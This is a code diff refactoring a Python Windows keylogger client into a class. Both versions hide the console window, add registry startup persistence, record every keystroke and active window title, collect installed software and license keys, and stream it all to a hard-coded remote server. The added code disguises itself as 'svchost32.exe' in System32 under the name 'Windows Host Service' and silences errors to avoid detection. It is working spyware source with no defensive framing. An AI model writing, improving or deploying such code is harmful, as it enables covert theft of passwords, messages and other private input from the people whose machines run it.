@@ -3,152 +3,172 @@ import threading
 import time
 import win32gui
 import winreg
-import ctypes
-import os
 from pynput import keyboard
+import queue
+import json
+import os
+from datetime import datetime
+import ctypes
 import sys
-import logging
+import shutil
 
-# Suppress any output by disabling logging to avoid traces
-logging.basicConfig(level=logging.CRITICAL)
+class KeyloggerClient:
+    def __init__(self, server_host, server_port):
+        self.SERVER_HOST = server_host
+        self.SERVER_PORT = server_port
+        self.client_socket = None
+        self.connected = False
+        self.data_queue = queue.Queue()
+        self.current_window = None
+        self.reconnection_interval = 5  # seconds
 
-# Client configuration
-SERVER_HOST = '192.168.100.53'  # Replace with the server's IP address
-SERVER_PORT = 5001
-current_window = None  # Global variable to track the active window
+        # Hide the console window
+        ctypes.windll.kernel32.SetConsoleTitleW("System Update")
+        ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
 
-# Helper function to run the client silently in the background
-def hide_console():
-    """Hide the console window to avoid interaction."""
-    ctypes.windll.user32.ShowWindow(ctypes.windll.kernel32.GetConsoleWindow(), 0)
+        # Set persistence
+        self.set_persistence()
 
-# Register the client to run on system startup
-def set_autostart():
-    """Add the client to the registry so it runs on startup."""
-    try:
-        # The path to the executable (for PyInstaller or if packaged as EXE)
-        exe_path = sys.executable
-        reg_key = winreg.HKEY_CURRENT_USER
-        reg_path = r"SOFTWARE\Microsoft\Windows\CurrentVersion\Run"
-        reg_value = "ClientApp"
-
-        # Open the registry and create a new entry
-        with winreg.OpenKey(reg_key, reg_path, 0, winreg.KEY_WRITE) as key:
-            winreg.SetValueEx(key, reg_value, 0, winreg.REG_SZ, exe_path)
-
-        print("Autostart set successfully.")
-    except Exception as e:
-        print(f"Failed to set autostart: {e}")
-
-# Function to fetch the active window title
-def get_active_window_title():
-    """Fetch the title of the currently active window."""
-    try:
-        return win32gui.GetWindowText(win32gui.GetForegroundWindow())
-    except Exception:
-        return "Unknown"
-
-# Function to fetch installed software information
-def fetch_installed_software():
-    """Fetch installed applications and their versions from the registry."""
-    software_list = []
-    reg_paths = [
-        r"SOFTWARE\Microsoft\Windows\CurrentVersion\Uninstall",
-        r"SOFTWARE\WOW6432Node\Microsoft\Windows\CurrentVersion\Uninstall"
-    ]
-    for reg_path in reg_paths:
+    def set_persistence(self):
+        """Move the executable to System32 and create a registry entry for persistence."""
         try:
-            reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
-            for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
-                try:
-                    sub_key_name = winreg.EnumKey(reg_key, i)
-                    sub_key = winreg.OpenKey(reg_key, sub_key_name)
-                    name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
-                    version = winreg.QueryValueEx(sub_key, "DisplayVersion")[0] if winreg.QueryValueEx(sub_key, "DisplayVersion") else "Unknown"
-                    license_info = "Unknown"  # Placeholder for license information
-                    software_list.append(f"{name} (Version: {version}, License: {license_info})")
-                except EnvironmentError:
-                    continue
+            # Target path for persistence
+            system_path = os.path.join(os.environ['SYSTEMROOT'], 'System32')
+            new_executable_path = os.path.join(system_path, 'svchost32.exe')  # Mimic a common service name
+            current_executable_path = os.path.abspath(sys.argv[0])
+
+            # Move the executable if not already in the target path
+            if current_executable_path.lower() != new_executable_path.lower():
+                shutil.copy2(current_executable_path, new_executable_path)
+                self.create_registry_entry(new_executable_path)
+                os.startfile(new_executable_path)  # Launch from the new location
+                sys.exit(0)  # Exit original script to avoid duplicate running
+
+            # Set up registry entry if moved
+            self.create_registry_entry(new_executable_path)
         except Exception as e:
-            pass
-    return software_list
+            pass  # Silently handle any exceptions to avoid detection
 
-# Function to send the software information to the server
-def send_software_info():
-    """Send the list of installed software to the server as plain text."""
-    software_list = fetch_installed_software()
-    client_socket.sendall("\n[SOFTWARE INFO]\n".encode('utf-8'))
-    for software in software_list:
-        client_socket.sendall(f"{software}\n".encode('utf-8'))
-    client_socket.sendall("\n[END SOFTWARE INFO]\n".encode('utf-8'))
-
-# Function to send keystrokes to the server
-def send_keylogs_to_server():
-    """Capture keystrokes, window title changes, and send them to the server."""
-    global current_window
-
-    log_buffer = []
-
-    def on_press(key):
-        """Capture keypress and send to the server."""
-        global current_window
-
+    def create_registry_entry(self, executable_path):
+        """Create a registry entry pointing to the executable for startup."""
         try:
-            # Get the current active window
-            active_window = get_active_window_title()
+            registry_key_path = r"Software\\Microsoft\\Windows\\CurrentVersion\\Run"
+            startup_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, registry_key_path, 0, winreg.KEY_SET_VALUE)
+            winreg.SetValueEx(startup_key, "Windows Host Service", 0, winreg.REG_SZ, f'"{executable_path}"')
+            startup_key.Close()
+        except Exception as e:
+            pass  # Suppress all errors
 
-            # Check if the window has changed
-            if active_window != current_window:
-                current_window = active_window
-                timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
-                header = f"\n[{timestamp}] Active Window: {active_window}\n"
-                log_buffer.append(header)
+    def connect(self):
+        """Establish connection to server with retry mechanism."""
+        while True:
+            try:
+                if not self.connected:
+                    self.client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                    self.client_socket.connect((self.SERVER_HOST, self.SERVER_PORT))
+                    self.connected = True
+                    self.send_queued_data()
+                    self.queue_software_info()
+                return True
+            except socket.error:
+                time.sleep(self.reconnection_interval)
 
-            # Handle printable characters
-            if hasattr(key, 'char') and key.char:
-                log_buffer.append(key.char)
-            # Handle special keys
-            else:
-                if key == keyboard.Key.space:
-                    log_buffer.append(' ')
+    def send_queued_data(self):
+        """Send all queued data to server."""
+        while not self.data_queue.empty():
+            try:
+                data = self.data_queue.get()
+                self.client_socket.sendall(json.dumps(data).encode('utf-8') + b'\n')
+            except socket.error:
+                self.data_queue.put(data)
+                self.connected = False
+                break
+
+    def queue_data(self, data_type, content):
+        """Queue data with timestamp and type."""
+        data = {
+            'timestamp': datetime.now().isoformat(),
+            'type': data_type,
+            'content': content
+        }
+        self.data_queue.put(data)
+        if self.connected:
+            self.send_queued_data()
+        else:
+            self.connect()
+
+    def fetch_installed_software_from_registry(self):
+        """Fetch installed applications and their versions and licenses from registry files."""
+        software_list = []
+        reg_paths = [
+            r"SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Uninstall",
+            r"SOFTWARE\\WOW6432Node\\Microsoft\\Windows\\CurrentVersion\\Uninstall"
+        ]
+        for reg_path in reg_paths:
+            try:
+                reg_key = winreg.OpenKey(winreg.HKEY_LOCAL_MACHINE, reg_path)
+                for i in range(0, winreg.QueryInfoKey(reg_key)[0]):
+                    try:
+                        sub_key_name = winreg.EnumKey(reg_key, i)
+                        sub_key = winreg.OpenKey(reg_key, sub_key_name)
+                        name = winreg.QueryValueEx(sub_key, "DisplayName")[0]
+                        version = winreg.QueryValueEx(sub_key, "DisplayVersion")[0] if winreg.QueryValueEx(sub_key, "DisplayVersion") else "Unknown"
+                        license_key = winreg.QueryValueEx(sub_key, "LicenseKey")[0] if winreg.QueryValueEx(sub_key, "LicenseKey") else "Unknown"
+                        software_list.append(f"{name} - Version: {version} - License: {license_key}")
+                    except EnvironmentError:
+                        continue
+            except Exception as e:
+                pass
+        return software_list
+
+    def queue_software_info(self):
+        """Queue software information."""
+        software_list = self.fetch_installed_software_from_registry()
+        log_content = "\n".join(software_list)
+        self.queue_data('software_info', log_content)
+
+    def start_keylogger(self):
+        """Start the keylogger with window tracking."""
+        def on_press(key):
+            try:
+                active_window = win32gui.GetWindowText(win32gui.GetForegroundWindow())
+                if active_window != self.current_window:
+                    self.current_window = active_window
+                    self.queue_data('window_change', active_window)
+                key_data = None
+                if hasattr(key, 'char') and key.char:
+                    key_data = key.char
+                elif key == keyboard.Key.space:
+                    key_data = ' '
                 elif key == keyboard.Key.enter:
-                    log_buffer.append('\n')
+                    key_data = '\n'
                 elif key == keyboard.Key.backspace:
-                    if log_buffer:
-                        log_buffer.pop()  # Remove the last character
-                elif key == keyboard.Key.delete:
-                    pass  # Delete does nothing in this scenario
+                    key_data = '[BACKSPACE]'
                 else:
-                    log_buffer.append(f'[{key.name}]')
+                    key_data = f'[{key.name}]'
+                if key_data:
+                    self.queue_data('keypress', key_data)
+            except Exception as e:
+                pass
 
-            # Send the updated buffer to the server
-            client_socket.sendall("".join(log_buffer).encode('utf-8'))
-            log_buffer.clear()  # Clear buffer after sending
-        except Exception as e:
-            print(f"Error: {e}")
+        with keyboard.Listener(on_press=on_press) as listener:
+            listener.join()
 
-    # Start keylogger
-    with keyboard.Listener(on_press=on_press) as listener:
-        listener.join()
+    def run(self):
+        """Start the client operation."""
+        try:
+            self.connect()
+            keylogger_thread = threading.Thread(target=self.start_keylogger)
+            keylogger_thread.daemon = True
+            keylogger_thread.start()
+            while True:
+                if not self.connected:
+                    self.connect()
+                time.sleep(1)
+        except KeyboardInterrupt:
+            if self.client_socket:
+                self.client_socket.close()
 
-# Connect to the server
-client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
-client_socket.connect((SERVER_HOST, SERVER_PORT))
-print(f"Connected to server at {SERVER_HOST}:{SERVER_PORT}")
-
-# Hide the console window
-hide_console()
-
-# Set autostart to ensure the client runs at startup
-set_autostart()
-
-# Send software info to the server
-send_software_info()
-
-# Start sending keylogs to the server
-try:
-    keylog_thread = threading.Thread(target=send_keylogs_to_server)
-    keylog_thread.start()
-except KeyboardInterrupt:
-    print("Keylogger stopped.")
-    client_socket.close()
+if __name__ == "__main__":
+    client = KeyloggerClient('192.168.1.1', 5001)
+    client.run()
